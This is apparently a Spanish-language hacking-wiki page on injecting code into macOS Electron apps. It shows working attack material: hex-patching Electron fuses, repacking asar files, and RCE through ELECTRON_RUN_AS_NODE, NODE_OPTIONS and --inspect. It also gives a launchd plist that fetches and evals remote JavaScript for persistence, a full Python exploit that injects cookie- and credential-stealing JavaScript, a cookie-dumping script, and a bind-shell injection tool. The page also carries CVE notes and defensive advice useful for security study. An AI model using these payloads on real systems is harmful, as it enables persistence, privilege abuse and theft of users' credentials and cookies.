# Inyección en aplicaciones Electron de macOS

{{#include ../../../banners/hacktricks-training.md}}

## Información básica

Si no sabes qué es Electron, puedes encontrar [**mucha información aquí**](https://book.hacktricks.wiki/en/network-services-pentesting/pentesting-web/electron-desktop-apps/index.html#rce-xss--contextisolation). Pero por ahora solo necesitas saber que Electron ejecuta **node**.\
Y node tiene algunos **parámetros** y **variables de entorno** que pueden usarse para **hacer que ejecute otro código**, además del archivo indicado.

### Electron Fuses

Estas técnicas se explicarán a continuación, pero recientemente Electron ha añadido varios **security flags para prevenirlas**. Estos son los [**Electron Fuses**](https://www.electronjs.org/docs/latest/tutorial/fuses) y estos son los que se utilizan para **evitar** que las aplicaciones Electron en macOS **carguen código arbitrario**:<sup>[[1]](#references)</sup>

- **`RunAsNode`**: Si está deshabilitado, evita el uso de la variable de entorno **`ELECTRON_RUN_AS_NODE`** para inyectar código.
- **`EnableNodeCliInspectArguments`**: Si está deshabilitado, no se respetarán parámetros como `--inspect` y `--inspect-brk`. Evitando así esta forma de inyectar código.
- **`EnableEmbeddedAsarIntegrityValidation`**: Si está habilitado, el **archivo** **`asar`** cargado será **validado** por macOS. De este modo se **evita** la **inyección de código** mediante la modificación del contenido de este archivo.
- **`OnlyLoadAppFromAsar`**: Si está habilitado, en lugar de buscar para cargar en el siguiente orden: **`app.asar`**, **`app`** y finalmente **`default_app.asar`**, solo comprobará y utilizará app.asar, garantizando así que, cuando se **combina** con el fuse **`embeddedAsarIntegrityValidation`**, sea **imposible** **cargar código no validado**.
- **`LoadBrowserProcessSpecificV8Snapshot`**: Si está habilitado, el proceso del navegador utiliza el archivo llamado `browser_v8_context_snapshot.bin` para su snapshot de V8.

Otro fuse interesante que no evita la inyección de código es:

- **EnableCookieEncryption**: Si está habilitado, el almacén de cookies del disco se cifra mediante claves criptográficas del nivel del sistema operativo.

### Comprobación de Electron Fuses

Puedes **comprobar estos flags** desde una aplicación con:
```bash
npx @electron/fuses read --app /Applications/Slack.app

Analyzing app: Slack.app
Fuse Version: v1
RunAsNode is Disabled
EnableCookieEncryption is Enabled
EnableNodeOptionsEnvironmentVariable is Disabled
EnableNodeCliInspectArguments is Disabled
EnableEmbeddedAsarIntegrityValidation is Enabled
OnlyLoadAppFromAsar is Enabled
LoadBrowserProcessSpecificV8Snapshot is Disabled
```
### Modificación de Electron Fuses

Como se menciona en la [**documentación**](https://www.electronjs.org/docs/latest/tutorial/fuses#runasnode), la configuración de los **Electron Fuses** se encuentra dentro del **binario de Electron**, que contiene en algún lugar la cadena **`dL7pKGdnNz796PbbjQWNKmHXBZaB9tsX`**.<sup>[[1]](#references)</sup>

En las aplicaciones de macOS, normalmente se encuentra en `application.app/Contents/Frameworks/Electron Framework.framework/Electron Framework`
```bash
grep -R "dL7pKGdnNz796PbbjQWNKmHXBZaB9tsX" Slack.app/
Binary file Slack.app//Contents/Frameworks/Electron Framework.framework/Versions/A/Electron Framework matches
```
Puedes cargar este archivo en [https://hexed.it/](https://hexed.it/) y buscar la cadena anterior. Después de esta cadena puedes ver en ASCII un número "0" o "1" que indica si cada fuse está deshabilitado o habilitado. Simplemente modifica el código hexadecimal (`0x30` es `0` y `0x31` es `1`) para **modificar los valores de los fuses**.

<figure><img src="../../../images/image (34).png" alt=""><figcaption></figcaption></figure>

Ten en cuenta que, si intentas **sobrescribir** el binario **`Electron Framework`** dentro de una aplicación con estos bytes modificados, la app no se ejecutará.

## RCE agregando código a aplicaciones Electron

Podría haber **archivos JS/HTML externos** que una aplicación Electron esté utilizando, por lo que un atacante podría inyectar código en estos archivos, cuya firma no se comprobará, y ejecutar código arbitrario en el contexto de la app.

> [!CAUTION]
> Sin embargo, actualmente existen 2 limitaciones:
>
> - Se necesita el permiso **`kTCCServiceSystemPolicyAppBundles`** para modificar una App, por lo que, de forma predeterminada, esto ya no es posible.
> - El archivo **`asap`** compilado normalmente tiene los fuses **`embeddedAsarIntegrityValidation`** `and` **`onlyLoadAppFromAsar`** habilitados.
>
> Esto hace que esta vía de ataque sea más complicada (o imposible).

Ten en cuenta que es posible evadir el requisito de **`kTCCServiceSystemPolicyAppBundles`** copiando la aplicación a otro directorio (como **`/tmp`**), cambiando el nombre de la carpeta **`app.app/Contents`** a **`app.app/NotCon`**, **modificando** el archivo **asar** con tu código **malicioso**, cambiando su nombre de nuevo a **`app.app/Contents`** y ejecutándolo.<sup>[[5]](#references)</sup>

Puedes desempaquetar el código del archivo asar con:
```bash
npx asar extract app.asar app-decomp
```
Y vuelve a empaquetarlo después de haberlo modificado con:
```bash
npx asar pack app-decomp app-new.asar
```
## RCE con ELECTRON_RUN_AS_NODE

Según [**la documentación**](https://www.electronjs.org/docs/latest/api/environment-variables#electron_run_as_node), si se establece esta variable de entorno, iniciará el proceso como un proceso normal de Node.js.<sup>[[6]](#references)</sup>
```bash
# Run this
ELECTRON_RUN_AS_NODE=1 /Applications/Discord.app/Contents/MacOS/Discord
# Then from the nodeJS console execute:
require('child_process').execSync('/System/Applications/Calculator.app/Contents/MacOS/Calculator')
```
> [!CAUTION]
> Si el fuse **`RunAsNode`** está deshabilitado, la variable de entorno **`ELECTRON_RUN_AS_NODE`** se ignorará y esto no funcionará.

### Inyección desde el Plist de la App

Como se [**propone aquí**](https://www.trustedsec.com/blog/macos-injection-via-third-party-frameworks/), podrías abusar de esta variable de entorno en un plist para mantener la persistencia:<sup>[[2]](#references)</sup>
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<key>EnvironmentVariables</key>
<dict>
<key>ELECTRON_RUN_AS_NODE</key>
<string>true</string>
</dict>
<key>Label</key>
<string>com.xpnsec.hideme</string>
<key>ProgramArguments</key>
<array>
<string>/Applications/Slack.app/Contents/MacOS/Slack</string>
<string>-e</string>
<string>const { spawn } = require("child_process"); spawn("osascript", ["-l","JavaScript","-e","eval(ObjC.unwrap($.NSString.alloc.initWithDataEncoding( $.NSData.dataWithContentsOfURL( $.NSURL.URLWithString('http://stagingserver/apfell.js')), $.NSUTF8StringEncoding)));"]);</string>
</array>
<key>RunAtLoad</key>
<true/>
</dict>
</plist>
```
## RCE con `NODE_OPTIONS`

Puedes almacenar el payload en un archivo diferente y ejecutarlo:
```bash
# Content of /tmp/payload.js
require('child_process').execSync('/System/Applications/Calculator.app/Contents/MacOS/Calculator');

# Execute
NODE_OPTIONS="--require /tmp/payload.js" ELECTRON_RUN_AS_NODE=1 /Applications/Discord.app/Contents/MacOS/Discord
```
> [!CAUTION]
> Si el fuse **`EnableNodeOptionsEnvironmentVariable`** está **deshabilitado**, la app **ignorará** la variable de entorno **NODE_OPTIONS** al iniciarse, a menos que la variable de entorno **`ELECTRON_RUN_AS_NODE`** esté configurada, la cual también se **ignorará** si el fuse **`RunAsNode`** está deshabilitado.
>
> Si no configuras **`ELECTRON_RUN_AS_NODE`**, encontrarás el **error**: `Most NODE_OPTIONs are not supported in packaged apps. See documentation for more details.`

### Inyección desde el Plist de la aplicación

Podrías abusar de esta variable de entorno en un plist para mantener la persistencia añadiendo estas claves:
```xml
<dict>
<key>EnvironmentVariables</key>
<dict>
<key>ELECTRON_RUN_AS_NODE</key>
<string>true</string>
<key>NODE_OPTIONS</key>
<string>--require /tmp/payload.js</string>
</dict>
<key>Label</key>
<string>com.hacktricks.hideme</string>
<key>RunAtLoad</key>
<true/>
</dict>
```
## RCE mediante inspección

Según [**esto**](https://medium.com/@metnew/why-electron-apps-cant-store-your-secrets-confidentially-inspect-option-a49950d6d51f), si ejecutas una aplicación Electron con flags como **`--inspect`**, **`--inspect-brk`** y **`--remote-debugging-port`**, se **abrirá un puerto de depuración** al que podrás conectarte (por ejemplo, desde Chrome en `chrome://inspect`) y podrás **inyectarle código** o incluso iniciar nuevos procesos.<sup>[[7]](#references)</sup>\
Por ejemplo:
```bash
/Applications/Signal.app/Contents/MacOS/Signal --inspect=9229
# Connect to it using chrome://inspect and execute a calculator with:
require('child_process').execSync('/System/Applications/Calculator.app/Contents/MacOS/Calculator')
```
En [**esta publicación del blog**](https://hackerone.com/reports/1274695), esta depuración se aprovecha para hacer que un Chrome headless **descargue archivos arbitrarios en ubicaciones arbitrarias**.<sup>[[8]](#references)</sup>

> [!TIP]
> Si una app tiene su propia forma de comprobar si las variables de entorno o parámetros como `--inspect` están establecidos, podrías intentar **evitarla** durante el runtime usando el argumento `--inspect-brk`, que **detendrá la ejecución** al principio de la app y ejecutará un bypass (sobrescribiendo los argumentos o las variables de entorno del proceso actual, por ejemplo).

El siguiente fue un exploit en el que, monitorizando y ejecutando la app con el parámetro `--inspect-brk`, era posible evitar la protección personalizada que tenía (sobrescribiendo los parámetros del proceso para eliminar `--inspect-brk`) y después inyectar un payload JS para extraer cookies y credenciales de la app:
```python
import asyncio
import websockets
import json
import requests
import os
import psutil
from time import sleep

INSPECT_URL = None
CONT = 0
CONTEXT_ID = None
NAME = None
UNIQUE_ID = None

JS_PAYLOADS = """
var { webContents } = require('electron');
var fs = require('fs');

var wc = webContents.getAllWebContents()[0]


function writeToFile(filePath, content) {
const data = typeof content === 'string' ? content : JSON.stringify(content, null, 2);

fs.writeFile(filePath, data, (err) => {
if (err) {
console.error(`Error writing to file ${filePath}:`, err);
} else {
console.log(`File written successfully at ${filePath}`);
}
});
}

function get_cookies() {
intervalIdCookies = setInterval(() => {
console.log("Checking cookies...");
wc.session.cookies.get({})
.then((cookies) => {
tokenCookie = cookies.find(cookie => cookie.name === "token");
if (tokenCookie){
writeToFile("/tmp/cookies.txt", cookies);
clearInterval(intervalIdCookies);
wc.executeJavaScript(`alert("Cookies stolen and written to /tmp/cookies.txt")`);
}
})
}, 1000);
}

function get_creds() {
in_location = false;
intervalIdCreds = setInterval(() => {
if (wc.mainFrame.url.includes("https://www.victim.com/account/login")) {
in_location = true;
console.log("Injecting creds logger...");
wc.executeJavaScript(`
(function() {
email = document.getElementById('login_email_id');
password = document.getElementById('login_password_id');
if (password && email) {
return email.value+":"+password.value;
}
})();
`).then(result => {
writeToFile("/tmp/victim_credentials.txt", result);
})
}
else if (in_location) {
wc.executeJavaScript(`alert("Creds stolen and written to /tmp/victim_credentials.txt")`);
clearInterval(intervalIdCreds);
}
}, 10); // Check every 10ms
setTimeout(() => clearInterval(intervalId), 20000); // Stop after 20 seconds
}

get_cookies();
get_creds();
console.log("Payloads injected");
"""

async def get_debugger_url():
"""
Fetch the local inspector's WebSocket URL from the JSON endpoint.
Assumes there's exactly one debug target.
"""
global INSPECT_URL

url = "http://127.0.0.1:9229/json"
response = requests.get(url)
data = response.json()
if not data:
raise RuntimeError("No debug targets found on port 9229.")
# data[0] should contain an object with "webSocketDebuggerUrl"
ws_url = data[0].get("webSocketDebuggerUrl")
if not ws_url:
raise RuntimeError("webSocketDebuggerUrl not found in inspector data.")
INSPECT_URL = ws_url


async def monitor_victim():
print("Monitoring victim process...")
found = False
while not found:
sleep(1)  # Check every second
for process in psutil.process_iter(attrs=['pid', 'name']):
try:
# Check if the process name contains "victim"
if process.info['name'] and 'victim' in process.info['name']:
found = True
print(f"Found victim process (PID: {process.info['pid']}). Terminating...")
os.kill(process.info['pid'], 9)  # Force kill the process
except (psutil.NoSuchProcess, psutil.AccessDenied, psutil.ZombieProcess):
# Handle processes that might have terminated or are inaccessible
pass
os.system("open /Applications/victim.app --args --inspect-brk")

async def bypass_protections():
global CONTEXT_ID, NAME, UNIQUE_ID
print(f"Connecting to {INSPECT_URL} ...")

async with websockets.connect(INSPECT_URL) as ws:
data = await send_cmd(ws, "Runtime.enable", get_first=True)
CONTEXT_ID = data["params"]["context"]["id"]
NAME = data["params"]["context"]["name"]
UNIQUE_ID = data["params"]["context"]["uniqueId"]

sleep(1)

await send_cmd(ws, "Debugger.enable", {"maxScriptsCacheSize": 10000000})

await send_cmd(ws, "Profiler.enable")

await send_cmd(ws, "Debugger.setBlackboxPatterns", {"patterns": ["/node_modules/|/browser_components/"], "skipAnonnymous": False})

await send_cmd(ws, "Runtime.runIfWaitingForDebugger")

await send_cmd(ws, "Runtime.executionContextCreated", get_first=False, params={"context": {"id": CONTEXT_ID, "origin": "", "name": NAME, "uniqueId": UNIQUE_ID, "auxData": {"isDefault": True}}})

code_to_inject = """process['argv'] = ['/Applications/victim.app/Contents/MacOS/victim']"""
await send_cmd(ws, "Runtime.evaluate", get_first=False, params={"expression": code_to_inject, "uniqueContextId":UNIQUE_ID})
print("Injected code to bypass protections")


async def js_payloads():
global CONT, CONTEXT_ID, NAME, UNIQUE_ID

print(f"Connecting to {INSPECT_URL} ...")

async with websockets.connect(INSPECT_URL) as ws:
data = await send_cmd(ws, "Runtime.enable", get_first=True)
CONTEXT_ID = data["params"]["context"]["id"]
NAME = data["params"]["context"]["name"]
UNIQUE_ID = data["params"]["context"]["uniqueId"]
await send_cmd(ws, "Runtime.compileScript", get_first=False, params={"expression":JS_PAYLOADS,"sourceURL":"","persistScript":False,"executionContextId":1})
await send_cmd(ws, "Runtime.evaluate", get_first=False, params={"expression":JS_PAYLOADS,"objectGroup":"console","includeCommandLineAPI":True,"silent":False,"returnByValue":False,"generatePreview":True,"userGesture":False,"awaitPromise":False,"replMode":True,"allowUnsafeEvalBlockedByCSP":True,"uniqueContextId":UNIQUE_ID})



async def main():
await monitor_victim()
sleep(3)
await get_debugger_url()
await bypass_protections()

sleep(7)

await js_payloads()



async def send_cmd(ws, method, get_first=False, params={}):
"""
Send a command to the inspector and read until we get a response with matching "id".
"""
global CONT

CONT += 1

# Send the command
await ws.send(json.dumps({"id": CONT, "method": method, "params": params}))
sleep(0.4)

# Read messages until we get our command result
while True:
response = await ws.recv()
data = json.loads(response)

# Print for debugging
print(f"[{method} / {CONT}] ->", data)

if get_first:
return data

# If this message is a response to our command (by matching "id"), break
if data.get("id") == CONT:
return data

# Otherwise it's an event or unrelated message; keep reading

if __name__ == "__main__":
asyncio.run(main())
```
> [!CAUTION]
> Si el fuse **`EnableNodeCliInspectArguments`** está deshabilitado, la app **ignorará los parámetros de node** (como `--inspect`) cuando se inicie, a menos que la variable de entorno **`ELECTRON_RUN_AS_NODE`** esté configurada, lo que también se **ignorará** si el fuse **`RunAsNode`** está deshabilitado.
>
> Sin embargo, aún podrías usar el **parámetro de electron `--remote-debugging-port=9229`**, pero el payload anterior no funcionará para ejecutar otros procesos.

Usando el parámetro **`--remote-debugging-port=9222`** es posible robar cierta información de la Electron App, como el **historial** (con comandos GET) o las **cookies** del navegador (ya que se **descifran** dentro del navegador y existe un **json endpoint** que las proporciona).

Puedes aprender a hacerlo [**aquí**](https://posts.specterops.io/hands-in-the-cookie-jar-dumping-cookies-with-chromiums-remote-debugger-port-34c4f468844e) y [**aquí**](https://slyd0g.medium.com/debugging-cookie-dumping-failures-with-chromiums-remote-debugger-8a4c4d19429f) y usar la herramienta automática [WhiteChocolateMacademiaNut](https://github.com/slyd0g/WhiteChocolateMacademiaNut) o un script sencillo como:<sup>[[9]](#references)[[10]](#references)</sup>
```python
import websocket
ws = websocket.WebSocket()
ws.connect("ws://localhost:9222/devtools/page/85976D59050BFEFDBA48204E3D865D00", suppress_origin=True)
ws.send('{\"id\": 1, \"method\": \"Network.getAllCookies\"}')
print(ws.recv()
```
### Inyección desde el Plist de la App

Podrías abusar de esta variable de entorno en un plist para mantener la persistencia añadiendo estas claves:
```xml
<dict>
<key>ProgramArguments</key>
<array>
<string>/Applications/Slack.app/Contents/MacOS/Slack</string>
<string>--inspect</string>
</array>
<key>Label</key>
<string>com.hacktricks.hideme</string>
<key>RunAtLoad</key>
<true/>
</dict>
```
## TCC Bypass abusando de versiones antiguas

> [!TIP]
> El daemon TCC de macOS no comprueba la versión ejecutada de la aplicación. Por lo tanto, si **no puedes inyectar código en una aplicación Electron** mediante ninguna de las técnicas anteriores, podrías descargar una versión anterior de la APP e inyectar código en ella, ya que seguirá obteniendo los privilegios de TCC (a menos que Trust Cache lo impida).

## Ejecutar código que no sea JS

Las técnicas anteriores te permitirán ejecutar **código JS dentro del proceso de la aplicación Electron**. Sin embargo, recuerda que los **procesos secundarios se ejecutan bajo el mismo perfil de sandbox** que la aplicación principal y **heredan sus permisos de TCC**.\
Por lo tanto, si quieres abusar de entitlements para acceder a la cámara o al micrófono, por ejemplo, simplemente podrías **ejecutar otro binario desde el proceso**.

## Vulnerabilidades destacadas de Electron para macOS (2023-2024)

### CVE-2023-44402 – Bypass de la integridad de ASAR

Electron ≤22.3.23 y varias versiones preliminares de 23-27 permitían que un atacante con acceso de escritura a la carpeta `.app/Contents/Resources` eludiera los fuses `embeddedAsarIntegrityValidation` **y** `onlyLoadAppFromAsar`. El fallo era una *confusión del tipo de archivo* en el comprobador de integridad, que permitía cargar un **directorio llamado `app.asar`** creado por el atacante en lugar del archivo validado, por lo que cualquier JavaScript colocado dentro de ese directorio se ejecutaba al iniciar la aplicación. Por tanto, incluso los proveedores que habían seguido las recomendaciones de hardening y habilitado ambos fuses seguían siendo vulnerables en macOS.<sup>[[3]](#references)</sup>

Versiones de Electron corregidas: **22.3.24**, **24.8.3**, **25.8.1**, **26.2.1** y **27.0.0-alpha.7**. Los atacantes que encuentren una aplicación ejecutando una build antigua pueden sobrescribir `Contents/Resources/app.asar` con su propio directorio para ejecutar código con los entitlements de TCC de la aplicación.<sup>[[3]](#references)</sup>

### Cluster de CVE de 2024 “RunAsNode” / “enableNodeCliInspectArguments”

En enero de 2024, una serie de CVE (CVE-2024-23738 a CVE-2024-23743) puso de manifiesto que muchas aplicaciones Electron se distribuyen con los fuses **RunAsNode** y **EnableNodeCliInspectArguments** todavía habilitados. Por lo tanto, un atacante local puede volver a iniciar el programa con la variable de entorno `ELECTRON_RUN_AS_NODE=1` o con flags como `--inspect-brk` para convertirlo en un proceso Node.js *genérico* y heredar todos los permisos de sandbox y TCC de la aplicación.<sup>[[4]](#references)</sup>

Aunque el equipo de Electron cuestionó la clasificación como “crítica” y señaló que el atacante ya necesita ejecución de código local, el problema sigue siendo útil durante el post-exploitation, ya que convierte cualquier bundle vulnerable de Electron en un binario *living-off-the-land* que puede, por ejemplo, leer Contacts, Photos u otros recursos sensibles a los que la aplicación de escritorio ya tuviera acceso.<sup>[[4]](#references)</sup>

Recomendaciones defensivas de los mantenedores de Electron:<sup>[[4]](#references)</sup>

* Deshabilita los fuses `RunAsNode` y `EnableNodeCliInspectArguments` en las builds de producción.
* Usa la API **UtilityProcess** más reciente si tu aplicación necesita legítimamente un proceso auxiliar de Node.js, en lugar de volver a habilitar esos fuses.

## Inyección automática

- [**electroniz3r**](https://github.com/r3ggi/electroniz3r)

La herramienta [**electroniz3r**](https://github.com/r3ggi/electroniz3r) puede utilizarse fácilmente para **encontrar aplicaciones electron vulnerables** instaladas e inyectar código en ellas. Esta herramienta intentará utilizar la técnica **`--inspect`**:<sup>[[5]](#references)</sup>

Debes compilarla tú mismo y puedes utilizarla de la siguiente manera:
```bash
# Find electron apps
./electroniz3r list-apps

╔══════════════════════════════════════════════════════════════════════════════════════════════════════╗
║    Bundle identifier                      │       Path                                               ║
╚──────────────────────────────────────────────────────────────────────────────────────────────────────╝
com.microsoft.VSCode                         /Applications/Visual Studio Code.app
org.whispersystems.signal-desktop            /Applications/Signal.app
org.openvpn.client.app                       /Applications/OpenVPN Connect/OpenVPN Connect.app
com.neo4j.neo4j-desktop                      /Applications/Neo4j Desktop.app
com.electron.dockerdesktop                   /Applications/Docker.app/Contents/MacOS/Docker Desktop.app
org.openvpn.client.app                       /Applications/OpenVPN Connect/OpenVPN Connect.app
com.github.GitHubClient                      /Applications/GitHub Desktop.app
com.ledger.live                              /Applications/Ledger Live.app
com.postmanlabs.mac                          /Applications/Postman.app
com.tinyspeck.slackmacgap                    /Applications/Slack.app
com.hnc.Discord                              /Applications/Discord.app

# Check if an app has vulenrable fuses vulenrable
## It will check it by launching the app with the param "--inspect" and checking if the port opens
/electroniz3r verify "/Applications/Discord.app"

/Applications/Discord.app started the debug WebSocket server
The application is vulnerable!
You can now kill the app using `kill -9 57739`

# Get a shell inside discord
## For more precompiled-scripts check the code
./electroniz3r inject "/Applications/Discord.app" --predefined-script bindShell

/Applications/Discord.app started the debug WebSocket server
The webSocketDebuggerUrl is: ws://127.0.0.1:13337/8e0410f0-00e8-4e0e-92e4-58984daf37e5
Shell binding requested. Check `nc 127.0.0.1 12345`
```
- [https://github.com/boku7/Loki](https://github.com/boku7/Loki)

Loki fue diseñado para instalar una puerta trasera en aplicaciones Electron reemplazando los archivos JavaScript de las aplicaciones por los archivos JavaScript de Command & Control de Loki.

## References

- [1] [Fuses de Electron](https://www.electronjs.org/docs/latest/tutorial/fuses)
- [2] [Inyección en macOS mediante frameworks de terceros - TrustedSec](https://www.trustedsec.com/blog/macos-injection-via-third-party-frameworks)
- [3] [Bypass de la integridad de ASAR mediante confusión de tipo de archivo (GHSA-7m48-wc93-9g85)](https://github.com/electron/electron/security/advisories/GHSA-7m48-wc93-9g85)
- [4] [Declaración sobre los CVE de 'runAsNode' - Electron](https://www.electronjs.org/blog/statement-run-as-node-cves)
- [5] [DEF CON 31 - ELECTRONizando la privacidad de macOS - Una nueva arma para tu Red Teaming - Wojciech Reguła](https://m.youtube.com/watch?v=VWQY5R2A6X8)
- [6] [Variables de entorno | Electron](https://www.electronjs.org/docs/latest/api/environment-variables#electron_run_as_node)
- [7] [Por qué las aplicaciones Electron no pueden almacenar tus secretos de forma confidencial: opción --inspect](https://medium.com/@metnew/why-electron-apps-cant-store-your-secrets-confidentially-inspect-option-a49950d6d51f)
- [8] [Informe de HackerOne #1274695 - El debugging de Electron se abusó para descargar archivos arbitrarios](https://hackerone.com/reports/1274695)
- [9] [Manos en el tarro de las cookies: extracción de cookies con el puerto de Remote Debugger de Chromium - SpecterOps](https://posts.specterops.io/hands-in-the-cookie-jar-dumping-cookies-with-chromiums-remote-debugger-port-34c4f468844e)
- [10] [Depuración de fallos en la extracción de cookies con el Remote Debugger de Chromium - slyd0g](https://slyd0g.medium.com/debugging-cookie-dumping-failures-with-chromiums-remote-debugger-8a4c4d19429f)
{{#include ../../../banners/hacktricks-training.md}}
